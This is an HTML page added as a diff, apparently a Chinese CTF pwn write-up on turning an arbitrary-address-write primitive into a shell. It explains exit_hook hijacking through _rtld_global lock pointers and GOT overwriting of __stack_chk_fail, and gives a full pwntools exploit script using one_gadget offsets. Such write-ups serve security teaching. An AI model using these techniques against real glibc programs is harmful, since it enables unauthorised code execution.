@@ -1,0 +1,170 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="9832fc511c8da455bece84a8271b4df7">pwn入门-任意地址写</h1>
+<p>在最近的ctf比赛中，新学到一点知识和师傅们分享一下</p>
+<pre><code>void _input()
+{
+    void *buf;
+    read(0,&amp;buf,8ull)
+    read(0,buf,8ull)
+}</code></pre>
+<p>我们一般会通过这种代码获得<strong>任意地址写任意内容</strong>的能力</p>
+<p><strong>第一个位置输入要篡改内容的地址，</strong></p>
+<p><strong>第二个输入篡改后的内容</strong></p>
+<p>而有了这个能力之后，我们可以修改许多的内容来getshell</p>
+<p>或者是在堆题中（简单的uaf或者是double free题目中）我们可以通过堆漏洞的利用来获得向任意地址写任意内容的能力</p>
+<h2 data-content="1" id="c173ef578cc56a71f6f757060b246ce6">任意地址写-exit_hook劫持</h2>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513194600-5ea5aa22-111e-1.png"/></p>
+<p>这是一道关于任意地址写的题目，题目中同时出现了exit函数</p>
+<p>以及让我们获得任意地址写任意内容的能力</p>
+<p>我们先来看看exit函数是怎么运行的</p>
+<h3 data-content="1" id="7fd9eb250f1fd15471f405e60250293d">exit运行过程</h3>
+<pre><code>#include&lt;stdio.h&gt;
+
+int main()
+{
+    printf("maxwell");
+    exit(0);
+}</code></pre>
+<p>首先我们运行上述简单代码，然后在gdb调试中查看函数调用过程</p>
+<p>这一步时输入s步入</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513194624-6d1a3e88-111e-1.png"/></p>
+<p>观察到在exit函数内部存在__run_exit_handlers函数调用，这是在函数调用时经常存在的嵌套函数调用</p>
+<p>我们继续步入观察</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513194815-af4d095c-111e-1.png"/></p>
+<p>再次观察到调用了_dl_fini函数，为了观察方便，我们直接查看_dl_fini函数的源码</p>
+<pre><code>1 #ifdef SHARED
+ 2   int do_audit = 0;
+ 3  again:
+ 4 #endif
+ 5   for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)
+ 6     {
+ 7       /* Protect against concurrent loads and unloads.  */
+ 8       __rtld_lock_lock_recursive (GL(dl_load_lock));
+ 9 
+10       unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
+11       /* No need to do anything for empty namespaces or those used for
+12      auditing DSOs.  */
+13       if (nloaded == 0
+14 #ifdef SHARED
+15       || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit
+16 #endif
+17       )
+18     __rtld_lock_unlock_recursive (GL(dl_load_lock));</code></pre>
+<p>在_dl_fini中存在两个函数指针</p>
+<ol>
+<li>__rtld_lock_lock_recursive</li>
+<li>__rtld_lock_unlock_recursive</li>
+</ol>
+<p>我们可以利用任意地址写的能力，将这两个函数指针指向我们能getshell的函数，一般是指向one_gadget</p>
+<p>我们gdb查看一下这两个指针的信息</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513194853-c576b49e-111e-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513194905-cc9e0fb0-111e-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513194959-ed4c4e7a-111e-1.png"/><br/>
+我们可以看到，其中一个指针处于_rtld_global偏移为3848位的地址</p>
+<p>我们找到_rtld_global相对于libc的偏移</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513195034-01baf0e6-111f-1.png"/></p>
+<p>用该地址加上3848即是要篡改的函数指针的地址</p>
+<p>打远程中，我们获得libc基址后，可以去libc网站中查询该结构体距离libc基址的偏移，再加上3848即可</p>
+<h3 data-content="1" id="b21800d16a8384defbef181be30d37b0">题目分析</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513195235-4a12e024-111f-1.png"/></p>
+<p>先是利用了一个rand函数生成随机数，由于题目给了libc文件和ld文件，我们直接调用libc中的rand函数生成一个随机数并接收</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513195247-50ee01f8-111f-1.png"/></p>
+<p>即可绕过随机数检测</p>
+<p>gift函数中<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513195307-5cee76b8-111f-1.png"/></p>
+<p>给了我们puts函数的真实地址，我们可以通过这个地址减去偏移来获得libc基址并接收</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513195324-670cc974-111f-1.png"/></p>
+<p>程序内还给了一个任意地址写的函数，同时具备exit函数。即可利用到我们上面所分享的知识来getshell</p>
+<h3 data-content="1" id="538e67903cc9c13ecce9ddc360e4ded6">exp</h3>
+<pre><code>import requests
+from pwn import *
+from requests.auth import *
+import ctypes
+from ctypes import *
+context.log_level='debug'
+context(os='linux', arch='amd64')
+io = process('./pwn1')
+#io = remote('47.98.236.4',5002)
+elf = ELF('./pwn')
+
+libc = ELF('./libc-2.31.so')
+
+libcc = cdll.LoadLibrary('./libc-2.31.so')
+libcc.srand(libcc.time(0))
+
+ld = ELF('./ld-2.31.so')
+
+def dbg():
+    gdb.attach(io)
+    pause()
+
+a= libcc.rand()%0x6E
+print(a)
+io.recvuntil('please enter this challenge\n')
+
+io.sendline(str(a))
+io.recvuntil('0x')
+
+puts = int(io.recv(12),16)
+
+print(hex(puts))
+
+base = puts-libc.sym['puts']
+print(hex(base))
+
+io.recvuntil('Come and try it out\n')
+
+dbg()
+
+pay1 = b'a'*0x28+p64(0x04012BD)[:6]
+io.send(pay1)
+
+io.recvuntil("Congratulations on completing a big step")
+
+onegadget = [0xe3afe,0xe3b01,0xe3b04]
+one_gadget = base + onegadget[0]
+
+exit_hook = base+0x222f68
+
+io.send(p64(exit_hook))
+print(hex(exit_hook))
+pay222 = p64(one_gadget)
+io.send(p64(one_gadget))
+io.sendline('cat flag')
+io.interactive()</code></pre>
+<h2 data-content="1" id="666eb3ab708b3b250b4350124733756e">任意地址写-canary保护劫持</h2>
+<h3 data-content="1" id="9c932dbc9229168a0e7c2beb82269b46">canary机制讲解</h3>
+<p>我们知道在canary保护是一种用于保护栈溢出的机制，会在函数的末尾对栈空间内一个随机数的检测</p>
+<p>64位程序中<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513195348-75504cfe-111f-1.png"/><br/>
+32位程序中</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513195400-7c77ea8c-111f-1.jpg"/></p>
+<p>我们可以看到</p>
+<p>在64位程序中canary距离栈底rbp的距离为8字节</p>
+<p>在32位程序中canary距离栈底ebp的距离位0xc字节</p>
+<p>当然，canary的位置是题外话了，我们还是研究一下canary的调用机制</p>
+<p>我们对如下代码进行gdb调试</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
+  unsigned __int64 v6; // [rsp+18h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  read(0, buf, 0x100uLL);
+  return v6 - __readfsqword(0x28u);
+}</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513195638-dadbe4f2-111f-1.png"/></p>
+<p>输入大于24字节的内容触发canary保护</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513195722-f50e1bec-111f-1.png"/></p>
+<p>函数调用了一个名为__stack_chk_fail的函数，按理如果没有触发canary保护，程序会直接退出</p>
+<p>但此时调用了该函数，执行该函数之后程序也是直接退出了</p>
+<p>且该函数存在于plt表中，所以我们可以利用任意地址写的能力来劫持__stack_chk_fail函数的got表</p>
+<h3 data-content="1" id="f177fac25b7ea191aaabc66a960ec40e">题目分析</h3>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513195737-fdf0b436-111f-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513195753-07a2fdea-1120-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513195803-0d3ab28e-1120-1.png"/></p>
+<p>明显的栈溢出漏洞和canary保护，赠送了puts函数的真实地址，以及任意地址写的能力</p>
+<p>我们直接利用任意地址写的能力来修改<strong>stack_chk_fail的got表地址为one_gadget即可</strong>stack_chk_fail的got表可以直接查询ida得到<br/>
+libc基址通过泄露的puts函数真实地址de'dao</p>
+<p>exp不再过多赘述</p>
+</div>
+</div>
